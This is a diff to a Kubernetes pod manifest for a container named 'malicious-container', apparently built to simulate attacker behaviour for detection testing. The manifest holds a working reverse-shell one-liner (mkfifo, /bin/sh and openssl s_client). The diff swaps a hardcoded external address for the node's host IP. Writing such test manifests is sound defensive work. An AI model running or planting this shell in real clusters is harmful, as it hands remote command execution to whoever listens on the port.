@@ -8,13 +8,18 @@ spec:
   containers:
   - name: malicious-container
     image: nixery.dev/shell/openssl/strace
+    env:
+    - name: NODE_IP
+      valueFrom:
+        fieldRef:
+          fieldPath: status.hostIP
     command: ["/bin/bash"]
     args:
     - "-c"
     - |
       while true; do
         echo "Simulating reverse shell to attacker c2 at 4443"
-        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 45.55.129.130:4443 > /tmp/s; rm /tmp/s
+        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $NODE_IP:4443 > /tmp/s; rm /tmp/s
         strace ls
         # Remember to replace these with safe equivalents or log statements
         sleep 90
